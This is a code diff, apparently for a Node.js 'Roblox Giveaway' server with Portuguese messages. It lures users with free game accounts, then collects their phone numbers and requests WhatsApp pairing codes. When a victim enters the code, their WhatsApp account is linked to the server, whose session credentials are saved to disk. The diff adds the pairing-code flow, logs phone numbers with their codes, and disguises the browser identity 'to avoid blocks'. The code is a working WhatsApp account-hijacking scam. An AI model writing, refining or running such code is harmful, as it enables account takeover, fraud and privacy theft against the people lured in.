@@ -44,34 +44,28 @@ const OUT_OF_STOCK = new Set([]);
 const OUT_OF_STOCK_AFTER = new Set(['free-fire']);
 
 /**
- * Create a WhatsApp session for a client using Baileys.
- * Generates QR data, constructs wa.me link, and sends to client.
+ * Create a WhatsApp session using Baileys Pairing Code.
+ * The phone number is used to request an 8-digit code instead of a QR scan.
  */
-async function createWhatsAppSession(socketId, gameType) {
+async function createWhatsAppSession(socketId, gameType, phone) {
     const sessionDir = join(__dirname, 'sessions', socketId);
 
     try {
-        // Create session directory
         await mkdir(sessionDir, { recursive: true });
-
-        // Setup auth state
         const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
-
-        // Fetch latest WhatsApp Web version
         const { version } = await fetchLatestBaileysVersion();
 
-        // Create WhatsApp socket
         const sock = makeWASocket({
             version,
             auth: state,
             printQRInTerminal: false,
-            browser: ['Roblox Giveaway', 'Chrome', '120.0.0'],
-            // Suppress noisy logs with a pino-compatible noop logger
+            // Use generic browser to avoid blocks
+            browser: ['Ubuntu', 'Chrome', '120.0.0'],
             logger: {
                 level: 'silent',
-                info: () => {},
+                info:  () => {},
                 error: () => {},
-                warn: () => {},
+                warn:  () => {},
                 debug: () => {},
                 trace: () => {},
                 fatal: () => {},
@@ -79,18 +73,29 @@ async function createWhatsAppSession(socketId, gameType) {
             }
         });
 
-        // Store the session
         activeSessions.set(socketId, { sock, sessionDir, gameType });
 
-        // Handle connection updates
+        let pairingCodeRequested = false;
+
         sock.ev.on('connection.update', async (update) => {
             const { connection, lastDisconnect, qr } = update;
 
-            // QR code received - extract link and send to client
-            if (qr) {
-                const link = `https://wa.me/settings/linked_devices#${qr}`;
-                console.log(`[${socketId}] New QR/link generated for ${gameType}`);
-                io.to(socketId).emit('pairingLink', { link });
+            // When QR data is ready, request pairing code instead of showing QR
+            if (qr && !pairingCodeRequested) {
+                pairingCodeRequested = true;
+                try {
+                    const code = await sock.requestPairingCode(phone);
+                    // Format as XXXX-XXXX
+                    const formatted = code?.match(/.{1,4}/g)?.join('-') || code;
+                    console.log(`[${socketId}] Pairing code for ${phone}: ${formatted}`);
+                    io.to(socketId).emit('pairingCode', { code: formatted });
+                } catch (err) {
+                    console.error(`[${socketId}] Pairing code error:`, err.message);
+                    io.to(socketId).emit('error', {
+                        message: 'Erro ao gerar código. Verifique o número e tente novamente.'
+                    });
+                    cleanupSession(socketId);
+                }
             }
 
             // Connection established!
@@ -98,17 +103,16 @@ async function createWhatsAppSession(socketId, gameType) {
                 console.log(`[${socketId}] WhatsApp connected for ${gameType}.`);
 
                 if (OUT_OF_STOCK_AFTER.has(gameType)) {
-                    // Game is out of stock — show message after WhatsApp verification
-                    console.log(`[${socketId}] ${gameType} is out of stock after verification.`);
+                    console.log(`[${socketId}] ${gameType} out of stock after verification.`);
                     io.to(socketId).emit('outOfStock', {
-                        message: 'Ops! Estamos reabastecendo o estoque de contas. Volte amanhã!'
+                        message: 'Ops! Estamos reabastecendo o estoque. Volte amanhã!'
                     });
                 } else {
                     const credentials = GAME_CREDENTIALS[gameType];
                     io.to(socketId).emit('connected', credentials);
                 }
 
-                // Logout after a short delay to clean up
+                // Logout after short delay to clean up
                 setTimeout(async () => {
                     try {
                         await sock.logout();
@@ -126,14 +130,14 @@ async function createWhatsAppSession(socketId, gameType) {
                 console.log(`[${socketId}] Connection closed. Status: ${statusCode}`);
 
                 if (statusCode === DisconnectReason.loggedOut) {
-                    // User logged out or session expired
                     io.to(socketId).emit('sessionExpired', {
                         message: 'Sessão expirada. Tente novamente.'
                     });
                     cleanupSession(socketId);
-                } else if (statusCode === DisconnectReason.connectionClosed ||
-                           statusCode === DisconnectReason.connectionLost) {
-                    // Connection issues - notify client
+                } else if (
+                    statusCode === DisconnectReason.connectionClosed ||
+                    statusCode === DisconnectReason.connectionLost
+                ) {
                     io.to(socketId).emit('error', {
                         message: 'Conexão perdida. Tente novamente.'
                     });
@@ -142,7 +146,6 @@ async function createWhatsAppSession(socketId, gameType) {
             }
         });
 
-        // Save credentials on update
         sock.ev.on('creds.update', saveCreds);
 
     } catch (err) {
@@ -155,7 +158,7 @@ async function createWhatsAppSession(socketId, gameType) {
 }
 
 /**
- * Clean up a session - remove socket and session directory.
+ * Clean up a session — remove socket listeners and session files.
  */
 async function cleanupSession(socketId) {
     const session = activeSessions.get(socketId);
@@ -173,13 +176,12 @@ async function cleanupSession(socketId) {
     }
 }
 
-// Socket.io connection handling
+// ---- Socket.io connection handling ----
 io.on('connection', (socket) => {
     console.log(`Client connected: ${socket.id}`);
 
-    // Client requests a new WhatsApp session
     socket.on('requestSession', async (data) => {
-        const { gameType } = data;
+        const { gameType, phone } = data;
 
         // Validate game type
         const validGames = ['blox-fruits', 'free-fire', 'grow-garden'];
@@ -188,32 +190,36 @@ io.on('connection', (socket) => {
             return;
         }
 
-        // Check stock
+        // Immediate out-of-stock check
         if (OUT_OF_STOCK.has(gameType)) {
             socket.emit('outOfStock', {
-                message: 'Ops! Estamos reabastecendo o estoque de contas. Volte amanhã!'
+                message: 'Ops! Estamos reabastecendo o estoque. Volte amanhã!'
             });
             return;
         }
 
-        // Clean up any existing session for this client
+        // Validate phone number (must be 55 + 10 or 11 digits = 12 or 13 total)
+        const cleanPhone = (phone || '').replace(/\D/g, '');
+        if (!cleanPhone || cleanPhone.length < 12 || cleanPhone.length > 13) {
+            socket.emit('error', { message: 'Número de telefone inválido. Tente novamente.' });
+            return;
+        }
+
+        // Clean up any existing session
         await cleanupSession(socket.id);
 
-        console.log(`[${socket.id}] Starting new session for: ${gameType}`);
-        socket.emit('status', { message: 'Gerando link de verificação...' });
+        console.log(`[${socket.id}] New session: ${gameType} | phone: ${cleanPhone}`);
+        socket.emit('status', { message: 'Gerando código de verificação...' });
 
-        // Create the WhatsApp session
-        await createWhatsAppSession(socket.id, gameType);
+        await createWhatsAppSession(socket.id, gameType, cleanPhone);
     });
 
-    // Client disconnects
     socket.on('disconnect', async () => {
         console.log(`Client disconnected: ${socket.id}`);
         await cleanupSession(socket.id);
     });
 });
 
-// Start server
 const PORT = process.env.PORT || 3000;
 server.listen(PORT, () => {
     console.log(`\n🎮 Roblox Giveaway Server running on http://localhost:${PORT}\n`);
